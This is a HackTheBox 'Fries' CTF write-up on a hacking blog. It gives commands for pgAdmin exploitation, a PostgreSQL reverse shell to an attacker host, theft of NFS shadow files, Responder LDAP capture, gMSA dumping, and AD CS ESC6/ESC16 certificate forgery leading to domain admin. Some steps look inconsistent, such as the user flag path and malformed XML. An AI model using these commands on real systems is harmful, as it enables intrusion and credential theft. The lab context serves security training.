<!doctype html><html lang=en-us><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta http-equiv=X-UA-Compatible content="IE=edge"><meta name=generator content="Qubt theme for Hugo"><title>Hacking Articles</title>
<meta name=title content="Hacking Articles"><meta name=author content="Richie-Havoc"><meta name=description content="Expert ethical hacking tutorials, CTF writeups, and penetration testing guides. Learn cybersecurity through HackTheBox, TryHackMe walkthroughs."><meta name=google-adsense-account content="ca-pub-4834846196060641"><link type=text/css rel=stylesheet href=/css/main.bundle.min.c34ab593f7850b8e7984a77537a338f026bd2efcfe1715fbab66bda06475ab85.css integrity="sha256-w0q1k/eFC455hKd1N6M48Ca9Lvz+FxX7q2a9oGR1q4U="><script defer src=/js/main.bundle.min.5a00293bacd8510f50add105212cea76d541a955f6693035ef3128b638a21619.js integrity="sha256-WgApO6zYUQ9QrdEFISzqdtVBqVX2aTA17zEotjiiFhk="></script><link rel=apple-touch-icon sizes=180x180 href=/icon_hu74b16e164104d2d61e05b7604a924e01_486235_180x180_resize_box_3.png><link rel=icon type=image/png sizes=32x32 href=/icon_hu74b16e164104d2d61e05b7604a924e01_486235_32x32_resize_box_3.png><meta property="og:url" content="https://havocsec.me/pentesting/htb/htb-fries-complete-writeup/"><meta property="og:site_name" content="Hacking Articles"><meta property="og:title" content="HTB Fries-complete Writeup"><meta property="og:description" content="Fries is a full enterprise-style attack chain where a leaked pgAdmin credential leads to Docker RCE, NFS loot, LDAP credential capture, and finally AD CS (ESC6 + ESC16) abuse to forge an Administrator certificate. It’s a complete pivot-through-every-layer machine ending in total Domain compromise."><meta property="og:locale" content="en_us"><meta property="og:type" content="article"><meta property="article:section" content="pentesting"><meta property="article:published_time" content="2025-12-01T00:00:00+00:00"><meta property="article:modified_time" content="2025-12-03T14:00:30+03:00"><meta property="og:image" content="https://havocsec.me/thumbnail.png"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="https://havocsec.me/thumbnail.png"><meta name=twitter:title content="HTB Fries-complete Writeup"><meta name=twitter:description content="Fries is a full enterprise-style attack chain where a leaked pgAdmin credential leads to Docker RCE, NFS loot, LDAP credential capture, and finally AD CS (ESC6 + ESC16) abuse to forge an Administrator certificate. It’s a complete pivot-through-every-layer machine ending in total Domain compromise."><meta name=description content="Expert ethical hacking tutorials, CTF writeups, and penetration testing guides. Learn cybersecurity through HackTheBox, TryHackMe walkthroughs."><meta name=keywords content="Fries,htb,writeup,walkthrough,htb active machine"><meta name=author content="Richie-Havoc"><link rel=canonical href=https://havocsec.me/pentesting/htb/htb-fries-complete-writeup/><meta name=google-site-verification content="5kNQmF94i_v9xe8c753YHZ660ypehgkIpd5I_5VOPL0"><meta name=msvalidate.01 content="FC9BD45C329063D600401FC9551479B8"><meta property="og:type" content="article"><meta property="og:url" content="https://havocsec.me/pentesting/htb/htb-fries-complete-writeup/"><meta property="og:title" content="HTB Fries-complete Writeup"><meta property="og:description" content="Expert ethical hacking tutorials, CTF writeups, and penetration testing guides. Learn cybersecurity through HackTheBox, TryHackMe walkthroughs."><meta property="og:image" content><meta property="og:site_name" content="Hacking Articles"><meta property="og:locale" content="en_US"><meta property="article:published_time" content="2025-12-01T00:00:00Z"><meta property="article:modified_time" content="2025-12-03T14:00:30+03:00"><meta property="article:author" content="Richie-Havoc"><meta property="article:tag" content="Fries,htb"><meta property="article:tag" content="writeup"><meta property="article:tag" content="walkthrough"><meta property="article:tag" content="htb active machine"><meta name=twitter:card content="summary_large_image"><meta name=twitter:url content="https://havocsec.me/pentesting/htb/htb-fries-complete-writeup/"><meta name=twitter:title content="HTB Fries-complete Writeup"><meta name=twitter:description content="Expert ethical hacking tutorials, CTF writeups, and penetration testing guides. Learn cybersecurity through HackTheBox, TryHackMe walkthroughs."><meta name=twitter:image content><meta name=twitter:site content="@HavocRichie?t=smiK1Is6LAWykS9FlJg4eQ&amp;s=09"><meta name=twitter:creator content="@HavocRichie?t=smiK1Is6LAWykS9FlJg4eQ&amp;s=09"><meta name=robots content="index, follow, max-image-preview:large, max-snippet:-1, max-video-preview:-1"><meta name=googlebot content="index, follow, max-snippet:-1, max-image-preview:large, max-video-preview:-1"><meta name=bingbot content="index, follow, max-snippet:-1, max-image-preview:large, max-video-preview:-1"><meta name=yandex content="index, follow"><meta name=baiduspider content="index, follow"><meta name=language content="English"><meta name=revisit-after content="7 days"><meta name=rating content="General"><meta name=tagline content="Advanced Ethical Hacking & Security Research Platform"><meta name=slogan content="Learn. Hack. Share. Repeat."><meta name=category content="Technology"><meta name=topic content="Cybersecurity, Ethical Hacking, Penetration Testing"><meta name=coverage content="Worldwide"><meta name=distribution content="Global"><meta name=target content="all"><meta name=audience content="Security Researchers, Ethical Hackers, CTF Players, Penetration Testers, Bug Bounty Hunters, Cybersecurity Students"><meta name=geo.region content="US"><meta name=geo.placename content="United States"><meta name=mobile-web-app-capable content="yes"><meta name=apple-mobile-web-app-capable content="yes"><meta name=apple-mobile-web-app-status-bar-style content="black-translucent"><meta name=apple-mobile-web-app-title content="Hacking Articles"><meta name=article:section content="pentesting"><meta name=article:subtitle content="A practical, detailed guide to exploiting the fries machine on htb—covering enumeration to  privilege escalation ."><meta name=article:summary content="Fries is a full enterprise-style attack chain where a leaked pgAdmin credential leads to Docker RCE, NFS loot, LDAP credential capture, and finally AD CS (ESC6 + ESC16) abuse to forge an Administrator certificate. It’s a complete pivot-through-every-layer machine ending in total Domain compromise."><meta property="article:publisher" content="https://havocsec.me"><meta name=publisher content="Hacking Articles"><meta name=copyright content="© 2025 Hacking Articles. All rights reserved."><meta name=alexaVerifyID content><meta name=norton-safeweb-site-verification content><meta name=thumbnail content><meta itemprop=name content="HTB Fries-complete Writeup"><meta itemprop=description content="Expert ethical hacking tutorials, CTF writeups, and penetration testing guides. Learn cybersecurity through HackTheBox, TryHackMe walkthroughs."><meta itemprop=image content><script type=application/ld+json>{"@context":"https://schema.org","@type":"HowTo","name":"HTB Fries-complete Writeup","description":"Fries is a full enterprise-style attack chain where a leaked pgAdmin credential leads to Docker RCE, NFS loot, LDAP credential capture, and finally AD CS (ESC6 \u002b ESC16) abuse to forge an Administrator certificate. It’s a complete pivot-through-every-layer machine ending in total Domain compromise.","image":"","datePublished":"2025-12-01T00:00:00Z","author":{"@type":"Person","name":"Richie-Havoc"},"publisher":{"@type":"Person","name":"Richie-Havoc"}}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Home","item":"https:\/\/havocsec.me\/"},{"@type":"ListItem","position":2,"name":"Pentesting","item":"https:\/\/havocsec.me\/pentesting/"},{"@type":"ListItem","position":3,"name":"HTB Fries-complete Writeup","item":"https:\/\/havocsec.me\/pentesting\/htb\/htb-fries-complete-writeup\/"}]}</script><script async src="https://www.googletagmanager.com/gtag/js?id=G-M2657LXPFW"></script><script>window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag("js",new Date),gtag("config","G-M2657LXPFW",{anonymize_ip:!0,send_page_view:!0})</script><meta name=htb-status content="active"><meta name=htb-retire content="2026-03-12"><meta name=htb-machine content="HTB Fries-complete Writeup"><script defer src=/js/htb-lock.min.8e60d76f7ed9b9c13cf2e4c3a5c793c6d1c62fe602afb5e4ef6143c03afca885.js integrity="sha256-jmDXb37ZucE88uTDpceTxtHGL+YCr7Xk72FDwDr8qIU="></script><link rel=stylesheet href=/css/htb-lock.min.189e4cc3c0aae97ea28bae651944806deba67932e2f485e2d05d9d4771ff1d07.css integrity="sha256-GJ5Mw8Cq6X6ii65lGUSAbeumeTLi9IXi0F2dR3H/HQc="><script>localStorage.getItem("color-theme")==="dark"||!("color-theme"in localStorage)&&window.matchMedia("(prefers-color-scheme: dark)").matches?document.documentElement.classList.add("dark"):document.documentElement.classList.remove("dark")</script></head><body class="flex h-screen flex-col justify-between bg-neutral-100 dark:bg-neutral-800"><div><header class="sticky top-0 z-10 bg-neutral-100 dark:bg-neutral-800"><section class="mx-auto flex max-w-(--breakpoint-xl) items-center justify-between p-4"><a href=https://havocsec.me/ class="flex items-center space-x-3"><img src=/logo_hu74b16e164104d2d61e05b7604a924e01_486235_filter_7015326143714700434.webp class="h-8 w-8" alt=Logo>
<span class="self-center whitespace-nowrap text-2xl font-semibold text-slate-700 dark:text-slate-400">Hacking Articles</span></a><div class="flex flex-row space-x-8"><nav class="hidden space-x-8 text-xl md:block" aria-label=main><a href=/ class="px-3 py-2 text-slate-700 hover:text-indigo-500 dark:text-slate-400 md:p-0">Home
</a><a href=/about/ class="px-3 py-2 text-slate-700 hover:text-indigo-500 dark:text-slate-400 md:p-0">Whoami
</a><a href=/blog/ class="px-3 py-2 text-slate-700 hover:text-indigo-500 dark:text-slate-400 md:p-0">Blog
</a><a href=/ctf/ class="px-3 py-2 text-slate-700 hover:text-indigo-500 dark:text-slate-400 md:p-0">CTF
</a><a href=/pentesting/ class="px-3 py-2 text-slate-700 hover:text-indigo-500 dark:text-slate-400 md:p-0">Pentesting
</a><a href=/chitchat/ class="px-3 py-2 text-slate-700 hover:text-indigo-500 dark:text-slate-400 md:p-0">Chitchat</a></nav><button id=theme-toggle type=button class="rounded-lg text-sm text-slate-700 hover:text-indigo-500 dark:text-slate-400" aria-label=theme-switcher>
<svg id="theme-toggle-dark-icon" class="hidden h-6 w-6" fill="currentcolor" viewBox="0 0 20 20" xmlns="http://www.w3.org/2000/svg"><path d="M17.293 13.293A8 8 0 016.707 2.707a8.001 8.001.0 1010.586 10.586z"/></svg>
<svg id="theme-toggle-light-icon" class="hidden h-6 w-6" fill="currentcolor" viewBox="0 0 20 20" xmlns="http://www.w3.org/2000/svg"><path d="M10 2a1 1 0 011 1v1A1 1 0 119 4V3a1 1 0 011-1zm4 8a4 4 0 11-8 0 4 4 0 018 0zm-.464 4.95.707.707a1 1 0 001.414-1.414l-.707-.707a1 1 0 00-1.414 1.414zm2.12-10.607a1 1 0 010 1.414l-.706.707A1 1 0 1113.536 5.05l.707-.707a1 1 0 011.414.0zM17 11a1 1 0 100-2h-1a1 1 0 100 2h1zm-7 4a1 1 0 011 1v1a1 1 0 11-2 0v-1a1 1 0 011-1zM5.05 6.464A1 1 0 106.465 5.05l-.708-.707A1 1 0 004.343 5.757l.707.707zm1.414 8.486-.707.707a1 1 0 01-1.414-1.414l.707-.707a1 1 0 011.414 1.414zM4 11a1 1 0 100-2H3a1 1 0 000 2h1z" fill-rule="evenodd" clip-rule="evenodd"/></svg>
</button>
<button id=hamburger-button class="relative h-8 w-8 cursor-pointer text-3xl md:hidden" aria-label=hamburger-button><div class="absolute top-4 -mt-0.5 h-[3px] w-8 rounded-sm bg-slate-700 transition-all duration-500 before:absolute before:h-[3px] before:w-8 before:-translate-x-4 before:-translate-y-2.5 before:rounded-sm before:bg-slate-700 before:transition-all before:duration-500 before:content-[''] after:absolute after:h-[3px] after:w-8 after:-translate-x-4 after:translate-y-2.5 after:rounded-sm after:bg-slate-700 after:transition-all after:duration-500 after:content-[''] dark:bg-slate-400 dark:before:bg-slate-400 dark:after:bg-slate-400"></div></button></div></section><section id=mobile-menu class="absolute hidden w-full origin-top animate-open-menu flex-col justify-center bg-neutral-100 text-4xl dark:bg-neutral-800"><nav class="flex min-h-screen flex-col items-center py-8" aria-label=mobile><a href=/ class="px-3 py-2 text-center text-slate-700 hover:text-indigo-500 dark:text-slate-400 md:p-0">Home
</a><a href=/about/ class="px-3 py-2 text-center text-slate-700 hover:text-indigo-500 dark:text-slate-400 md:p-0">Whoami
</a><a href=/blog/ class="px-3 py-2 text-center text-slate-700 hover:text-indigo-500 dark:text-slate-400 md:p-0">Blog
</a><a href=/ctf/ class="px-3 py-2 text-center text-slate-700 hover:text-indigo-500 dark:text-slate-400 md:p-0">CTF
</a><a href=/pentesting/ class="px-3 py-2 text-center text-slate-700 hover:text-indigo-500 dark:text-slate-400 md:p-0">Pentesting
</a><a href=/chitchat/ class="px-3 py-2 text-center text-slate-700 hover:text-indigo-500 dark:text-slate-400 md:p-0">Chitchat</a></nav></section></header><main><div class="justify-left mx-auto mt-8 flex max-w-(--breakpoint-md) px-4"><article><h1 class="text-4xl font-extrabold text-slate-700 dark:text-slate-200">HTB Fries-complete Writeup</h1><h2 class="mt-4 text-2xl text-slate-500 dark:text-slate-400">A practical, detailed guide to exploiting the fries machine on htb—covering enumeration to privilege escalation .</h2><div class="mb-4 mt-2 text-sm text-slate-500 dark:text-slate-400">Dec 1, 2025 - 4 minute read</div><div class="flex flex-col"><img class="mt-4 h-full w-full object-cover" src=/pwnedfries_hu66f9fea112e4a75134f57ab5393ac3cd_123150_filter_11492400015018413633.webp alt="feature image" height=657 width=736>
<span class="mb-4 mt-1 text-center text-sm text-slate-700 dark:text-slate-200">fries pwned image</span></div><span class="prose prose-slate break-words text-lg text-slate-700 dark:prose-invert prose-pre:max-w-[90vw] dark:text-slate-200 md:prose-pre:max-w-(--breakpoint-md) prose-code:before:hidden prose-code:after:hidden"><p><strong>Box Overview</strong></p><p>Machine Name: Fries</p><p>Difficulty: Hard</p><p>OS: Windows Server 2019 Domain Controller + Linux (Docker host)</p><p>Initial Credentials: <a href=mailto:d.cooper@fries.htb>d.cooper@fries.htb</a> / D4LE1nteam!!</p><p>(These credentials appear in the environment vars of a service container, giving immediate foothold.)</p><p><strong>Exploitation Summary</strong></p><p>The attack chain on Fries is long and layered. The box expects you to pivot across multiple technologies:</p><ul><li>Reconnaissance + Initial Access via pgAdmin</li><li>Postgres SQL RCE → Docker container shell</li><li>NFS Enumeration → Retrieval of Certificates & Sensitive Files</li><li>LDAP Credential Capture via Responder</li><li>Dump & Abuse of GMSA (Group Managed Service Account)</li><li>Enumeration of CA Misconfigurations (ESC6 + ESC16)</li><li>Privilege Escalation to Domain Admin using Certificate Abuse</li><li>Flag Retrieval</li></ul><p>This is a modern, enterprise-grade attack chain: misconfigured certificate templates, gMSA accounts, NFS shares, Docker breakout patterns, and AD CS exploitation.</p><p><strong>1. Initial Reconnaissance</strong></p><p>Nmap Scan</p><pre tabindex=0><code>sudo nmap -sS -sV -p- -T4 10.10.&lt;IP_Machine&gt; -oN nmap_initial.txt
</code></pre><blockquote><p>Port Service Details</p><p>80/tcp HTTP fries-restaurant website</p><p>88/tcp Kerberos Domain: FRIES.HTB</p><p>389, 636 LDAP/LDAPS Active Directory</p><p>445 SMB Domain assets</p><p>5432 PostgreSQL Docker container</p><p>5985 WinRM Possible shell</p><p>7000+ range Custom services Mentioned in PDF scans</p></blockquote><p>The key discovery: PostgreSQL in Docker, which becomes our first foothold.</p><p><strong>2. Initial Access – pgAdmin</strong></p><p>Credential Discovery</p><p>initial user credentials were found inside the Docker container’s environment variables:</p><p><a href=mailto:d.cooper@fries.htb>d.cooper@fries.htb</a>:D4LE1nteam!!</p><p>These credentials allow:</p><p>Login to pgAdmin</p><blockquote><p>Access to <a href=https://code.fries.htb>https://code.fries.htb</a></p></blockquote><p>Later AD/LDAP movement</p><p>Metasploit pgAdmin Exploit</p><pre tabindex=0><code>msfconsole
use exploit/multi/http/pgadmin_query_tool_authenticated
set RHOSTS db-mgnt.fries.htb
set USERNAME d.cooper@fries.htb
set PASSWORD D4LE1nteam!!
set SSL true
set LHOST &lt;IP&gt;
set LPORT 4444
exploit
</code></pre><p>This gives a container shell as postgres.</p><p><strong>3. PostgreSQL RCE → Shell</strong></p><p>Query-Based RCE</p><pre tabindex=0><code>DROP TABLE IF EXISTS cmd_test;
CREATE TABLE cmd_test(output text);
COPY cmd_test FROM PROGRAM &#39;whoami&#39;;
SELECT * FROM cmd_test;
</code></pre><p>Reverse Shell</p><pre tabindex=0><code>DROP TABLE IF EXISTS cmd_test;
CREATE TABLE cmd_test(output text);
COPY cmd_test FROM PROGRAM &#39;bash -c &#34;bash -i &gt;&amp; /dev/tcp/&lt;IP&gt;/4445 0&gt;&amp;1&#34;&#39;;
</code></pre><p>Listener:</p><pre tabindex=0><code>nc -lnvp 4445
</code></pre><p>Result: shell as postgres inside the Docker container (172.18.0.3).</p><p><strong>4. Docker Network Exploration</strong></p><p>In the pgAdmin container:</p><p>Upgrade Shell</p><pre tabindex=0><code>python3 -c &#39;import pty; pty.spawn(&#34;/bin/bash&#34;)&#39;
</code></pre><p>Tool Discovery</p><p>Found in /data-directory:</p><p>chisel – used later</p><p>nfsclient – used for NFS enumeration</p><p>Download nfsclient</p><pre tabindex=0><code>wget https://github.com/sahlberg/libnfs/releases/download/libnfs-5.0.3/libnfsclient-linux
chmod +x ./nfsclient
</code></pre><p>NFS Share Exploration</p><pre tabindex=0><code>./nfsclient 172.18.0.1:/srv/web.fries.htb root:0:59066503 ls
</code></pre><p>Retrieved Files</p><p>Certificates</p><p>Shadow/passwd</p><p>Sensitive configs</p><p>Example:</p><pre tabindex=0><code>./nfsclient 172.18.0.1:/srv/web.fries.htb root:0:59066503 get certs/ /tmp/certs/
./nfsclient 172.18.0.1:/srv/web.fries.htb root:0:59066503 get shadow /tmp/shadow
./nfsclient 172.18.0.1:/srv/web.fries.htb root:0:59066503 get passwd /tmp/passwd
</code></pre><p>Used hashcat/john to crack passwords for PWM access.</p><p><strong>5. Host Filesystem Access (Real NFS Mount)</strong></p><p>Find File Handle</p><pre tabindex=0><code>nfs_analyze 127.0.0.1:/srv/web.fries.htb
</code></pre><p>Mount the share</p><pre tabindex=0><code>mkdir -p /tmp/mount3
fuse_nfs /tmp/mount3 127.0.0.1 --fake-uid --allow-write --manual-fh &lt;FILE_HANDLE&gt;
</code></pre><p>Once mounted, attacker can fully browse server files and extract secrets.</p><p><strong>6. LDAP Credential Capture – Responder Attack</strong></p><p>Access login panel:</p><pre tabindex=0><code>https://pwm.fries.htb
</code></pre><p>After cracking PWM credentials → Download configuration:</p><p>Download: /tmp/PwmConfiguration.xml</p><p>Modify:</p><pre tabindex=0><code>&lt;nm setting-key=&#34;ldap.serverUrls&#34;&gt;
&lt;setting:Value&gt;ldap://127.0.0.1:389&lt;/value&gt;
</code></pre><p>Start responder:</p><pre tabindex=0><code>sudo responder -I tun0
</code></pre><p>Upload modified XML → LDAP hash captured.</p><p>These creds belong to svc_infra (gMSA-related account).</p><p><strong>7. Enumeration with svc_infra</strong></p><p>Dump GMSA Password</p><pre tabindex=0><code>bloodyAD -host &lt;IP&gt; -d fries.htb -u svc_infra -p &#39;&lt;PASSWORD&gt;&#39; get password SVC_INFRA
</code></pre><p>We get:</p><p>gMSA plaintext password</p><p>NTLM hash</p><p>WinRM with gMSA</p><pre tabindex=0><code>evil-winrm -i &lt;IP&gt; -u &#39;SVC_CA_prods$&#39; -H &#39;&lt;HASH&gt;&#39;
</code></pre><p>The PDF confirms this works.</p><p><strong>8. CA Permissions Enumeration</strong></p><p>Upload Certify.exe:</p><pre tabindex=0><code>certify.exe find
</code></pre><p>Findings:</p><p>SVC_CA_prods$ has:</p><p>ManageCA</p><p>Enroll rights</p><p>Can request certificates from some templates</p><p>Domain Computers membership</p><p>Critical: ESC6 + ESC16 misconfigurations found.</p><p><strong>9. CA Configuration – ESC6 + ESC16</strong></p><pre tabindex=0><code>ESC6 = Allows arbitrary SAN
ESC16 = Disables extension list (dangerous)
PowerShell: Enable ESC6
$Config = &#39;DC01.fries.htb\fries-DC01-CA&#39;
$Enum = 0x40000000
certutil -config $Config -getreg policy\EditFlags
certutil -config $Config -setreg policy\EditFlags +$Enum
Restart-Service certsvc -force
</code></pre><pre tabindex=0><code>Disable Extension List (ESC16)
certutil -config &#34;$Config&#34; -setreg policy\DisableExtensionList +0x20
Restart-Service certsvc -force
</code></pre><p><strong>10. ESC6 + ESC16 Exploitation</strong></p><p>Problem:</p><p>gMSA cannot enroll for templates requiring SYSTEM rights.</p><p>Solution:</p><p>Use svc_infra because:</p><p>It is a normal domain user</p><p>User templates accept it</p><p>ESC6 allows adding arbitrary UPNs</p><p>ESC16 disables extension checks</p><p>Request Administrator Certificate</p><p>Time sync:</p><pre tabindex=0><code>sudo ntpdate &lt;IP&gt;
</code></pre><p>Request:</p><pre tabindex=0><code>certipy-ad req -u svc_infra -p &#39;&lt;PASS&gt;&#39; -dc-ip &lt;IP&gt; -template User
</code></pre><p><strong>11. Become Administrator</strong></p><p>Retrieve NTLM hash via PKINIT</p><pre tabindex=0><code>certipy-ad auth -pfx administrator.pfx -dc-ip &lt;IP&gt;
</code></pre><p>WinRM:</p><pre tabindex=0><code>evil-winrm -i &lt;IP&gt; -u administrator -H &#39;&lt;HASH&gt;&#39;
</code></pre><p><img src=evilwinrm.png alt></p><p>Full domain compromise achieved.</p><p><strong>12. Flags</strong></p><p><img src=lsfinal.png alt></p><p><strong>User Flag</strong></p><pre tabindex=0><code>type C:\Users\Administrator\Desktop\user.txt
</code></pre><p><strong>Root Flag</strong></p><pre tabindex=0><code>type C:\Users\Administrator\Desktop\root.txt
</code></pre><p><img src=flags.png alt></p><p>Techniques Used</p><ul><li>Summarized from PDF:</li><li>Container Escape: pgAdmin → PostgreSQL → Docker host</li><li>NFS Enumeration + File Extraction</li><li>LDAP Credential Capture</li><li>GMSA Password Dump</li><li>ESC6 & ESC16 Certificate Template Abuse</li><li>Administrator impersonation via forged certificate</li><li>WinRM final access</li></ul><p><img src=final.png alt></p></span></article></div></main></div><footer><div class="flex flex-col justify-center p-10"><p class="text-center text-slate-700 dark:text-slate-400">&copy;
2025
Richie-Havoc</p><p class="text-center text-sm text-slate-700 dark:text-slate-400">Powered by <a class="hover:underline hover:decoration-indigo-500 hover:text-indigo-500" href=https://gohugo.io target=_blank rel="noopener noreferrer">Hugo</a> & <a class="hover:underline hover:decoration-indigo-500 hover:text-indigo-500" href=https://github.com/chrede88/qubt target=_blank rel="noopener noreferrer">Qubt</a></p></div></footer></body></html>